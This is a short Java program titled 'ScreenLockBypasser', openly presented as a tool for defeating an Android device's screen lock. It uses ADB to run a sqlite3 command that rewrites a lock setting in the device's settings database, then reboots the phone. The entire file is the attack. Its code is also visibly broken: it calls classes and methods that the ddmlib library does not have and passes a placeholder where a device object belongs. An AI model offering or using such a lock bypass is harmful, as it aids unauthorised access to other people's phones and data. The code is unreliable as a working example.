import com.android.ddmlib.*;
import java.util.*;

public class ScreenLockBypasser {
    public static void main(String[] args) throws Exception {
        // Connect to the device
AndroidDebugBridge adb = AndroidDebugBridge.createBridge(
            "127.0.0.1:5037", // Change to the IP and port of the device
false // Do not install an app
);
        adb.addDevice(/* Device object */); // Add the connected device
// Check device state
IDevice device = adb.getDevices().get(0); // Get the first device
if (!device.isOnline()) {
            throw new Exception("Device is not online");
        }
        if (device.getState() != IDevice.STATE_ONLINE) {
            throw new Exception("Device is not in online state");
        }

        // Bypass the screen lock
DeviceShell shell = device.getShell();
        shell.execute("sqlite3 /data/data/com.android.providers.settings/databases/settings.db \"update system set value=0 where name='lock_pattern_autolock';\"");
        shell.execute("reboot");

        // Wait for the device to reboot
Thread.sleep(30000); // 30 seconds
}
}

/*
 * Copyright © 2024 Devin B. Royal. All Rights Reserved.
 */